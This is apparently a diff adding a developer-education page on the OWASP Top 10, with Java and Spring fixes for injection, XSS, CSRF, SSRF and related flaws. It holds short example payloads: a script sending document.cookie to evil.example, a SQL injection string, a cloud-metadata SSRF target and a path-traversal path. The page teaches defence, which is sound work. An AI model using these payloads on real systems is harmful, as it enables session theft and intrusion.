@@ -1,0 +1,168 @@
+## Why it matters
+
+Attackers do not start with exotic tricks. They try the same short list of mistakes on every site, often
+with automated tools, and those mistakes keep working. The **OWASP Top 10** catalogues them. Knowing
+each one — and its standard fix — prevents most breaches you could cause as an application developer.
+
+## How it works
+
+### Injection (SQL, command, LDAP…)
+
+Untrusted input is glued into something that gets **interpreted**, and changes its meaning.
+
+<Compare>
+  <Bad title="String concatenation">
+
+```java
+String sql = "SELECT * FROM users WHERE email = '" + email + "'";
+// email = ' OR '1'='1   →  returns every user
+```
+
+  </Bad>
+  <Good title="Parameters">
+
+```java
+jdbc.query("SELECT * FROM users WHERE email = ?", mapper, email);
+```
+
+The query shape is fixed; input is only ever data. JPA, JdbcTemplate and JdbcClient all support this.
+
+  </Good>
+</Compare>
+
+The same applies to shell commands (`Runtime.exec` with user input), NoSQL queries, LDAP filters and
+template engines. Never build the command as a string; pass arguments separately and allow-list values.
+
+### Broken access control
+
+The top item on the list: users reach data or actions they should not. Examples: changing an id in the
+URL (**IDOR**), calling an admin endpoint the UI hides, modifying another user's resource.
+
+**Fix**: authorize on the server for every request; check ownership; deny by default; test it. See
+[Authentication and Authorization](/fundamentals/authentication-and-authorization).
+
+### Cross-site scripting (XSS)
+
+Attacker-controlled text is rendered as HTML or JavaScript in another user's browser, where it can steal
+data or act as that user.
+
+```html
+<!-- a comment saved as: <script>fetch('https://evil.example/?c='+document.cookie)</script> -->
+<div>${comment}</div>   <!-- rendered without escaping -->
+```
+
+**Fix**: escape output by context (React, Thymeleaf and most templates escape by default — avoid
+`dangerouslySetInnerHTML` / `th:utext` with user data); sanitise rich text with an allow-list;
+set a **Content-Security-Policy**; mark session cookies `HttpOnly`.
+
+### Cross-site request forgery (CSRF)
+
+A malicious page makes the victim's browser send a request to your site — and the browser attaches the
+victim's cookies automatically.
+
+<Mermaid
+  caption="CSRF: the attacker cannot read the response, but can make the victim’s browser perform an action with the victim’s cookies."
+  alt="Sequence diagram: the victim is logged in to bank.example and has a session cookie. The victim visits evil.example, whose page auto-submits a form to bank.example/transfer. The browser sends the request with the bank cookie, and without CSRF protection the bank performs the transfer."
+  chart={`
+sequenceDiagram
+    participant V as Victim's browser
+    participant E as evil.example
+    participant Bank as bank.example
+    V->>Bank: log in (gets session cookie)
+    V->>E: visit a malicious page
+    E-->>V: hidden form posting to bank.example/transfer
+    V->>Bank: POST /transfer (cookie attached automatically)
+    Bank-->>V: 200 — transfer done (if unprotected)
+`}
+/>
+
+**Fix**: CSRF tokens for cookie-authenticated forms (Spring Security enables them by default),
+`SameSite=Lax` or `Strict` cookies, and never changing state on GET. APIs authenticated only with an
+`Authorization` header are not exposed the same way, because browsers do not add that header automatically.
+
+### Server-side request forgery (SSRF)
+
+Your server fetches a URL the user supplied ("import from URL", webhooks, image previews) — and the
+attacker points it at internal systems: `http://169.254.169.254/` (cloud metadata with credentials),
+`http://localhost:8080/actuator`, internal admin services.
+
+**Fix**: allow-list destinations; resolve the hostname and block private, loopback and link-local
+addresses (re-check after redirects); run fetchers in a network segment without internal access;
+require IMDSv2 on AWS.
+
+### Security misconfiguration and exposed endpoints
+
+Default passwords, debug mode in production, verbose stack traces returned to users, open cloud storage
+buckets, all Actuator endpoints exposed publicly, permissive CORS (`*` with credentials).
+
+**Fix**: secure defaults, expose only what is needed, separate management ports, configuration reviewed
+like code.
+
+### Cryptographic failures and leaked secrets
+
+Sensitive data over plain HTTP, weak or home-made crypto, passwords hashed with MD5 — and, most often,
+**secrets committed to Git** or printed in logs.
+
+**Fix**: TLS everywhere, standard algorithms, a secrets manager, secret scanning in CI, and rotating
+anything that leaked (deleting the commit is not enough — it stays in history and forks).
+
+### Vulnerable and outdated components
+
+Your code may be fine while a dependency is not (Log4Shell in 2021 is the famous example).
+
+**Fix**: keep dependencies current, use dependency scanning (OWASP Dependency-Check, Dependabot, Snyk),
+know your software bill of materials (SBOM), and patch quickly.
+
+### Insecure deserialisation and mass assignment
+
+- Deserialising untrusted data into arbitrary types can execute code. Avoid Java native serialisation for
+  untrusted input; configure JSON mappers not to enable polymorphic typing from input.
+- Binding a request directly onto an entity lets a user set fields you never meant to expose
+  (`"role": "ADMIN"`). Use dedicated request DTOs.
+
+### And more worth knowing
+
+- **Identification failures**: no rate limit on login, no MFA, weak reset flows.
+- **Logging and monitoring failures**: attacks go unnoticed.
+- **Path traversal**: `../../etc/passwd` in a file name — normalise and check paths stay inside a base directory.
+- **Open redirects**: `?next=https://evil.example` — only redirect to allow-listed paths.
+
+## Quick reference
+
+<DecisionTable
+  columns={['Core fix']}
+  rows={[
+    { label: 'Injection', cells: ['Parameterised queries; no string-built commands'] },
+    { label: 'Broken access control', cells: ['Server-side authorization and ownership checks, deny by default'] },
+    { label: 'XSS', cells: ['Context-aware output escaping, CSP, HttpOnly cookies'] },
+    { label: 'CSRF', cells: ['CSRF tokens, SameSite cookies, no state changes on GET'] },
+    { label: 'SSRF', cells: ['Destination allow-lists; block internal addresses'] },
+    { label: 'Misconfiguration', cells: ['Secure defaults, minimal exposure, no stack traces to users'] },
+    { label: 'Leaked secrets', cells: ['Secrets manager, scanning, rotation'] },
+    { label: 'Vulnerable dependencies', cells: ['Scanning and prompt upgrades'] },
+    { label: 'Mass assignment', cells: ['Request DTOs with only the allowed fields'] },
+  ]}
+/>
+
+## When you'll meet it
+
+- **Every code review** — look for concatenated queries, missing ownership checks, and user-controlled URLs.
+- **A penetration-test report** — these categories will be the headings.
+- **A dependency alert** — assess, upgrade, redeploy.
+- **Interview:** "What is SQL injection and how do you prevent it?", "XSS versus CSRF?", "What is SSRF?"
+
+## In a Spring and Java app
+
+- [Security Hardening](/learn/security/security-hardening) and [The Security Filter Chain](/learn/security/filter-chain)
+  apply these defences with Spring Security; [PreparedStatement](/jdbc/prepared-statement) shows
+  injection in JDBC.
+
+<KeyTakeaways
+  points={[
+    'Injection is prevented by parameters, never by string building.',
+    'Broken access control is the most common flaw — authorize every request on the server.',
+    'XSS runs attacker script in users’ browsers; escape output and use CSP. CSRF abuses automatic cookies; use tokens and SameSite.',
+    'SSRF turns your server into a proxy to internal systems; allow-list destinations.',
+    'Secure configuration, secrets management, dependency scanning and DTOs close the rest of the common gaps.',
+  ]}
+/>
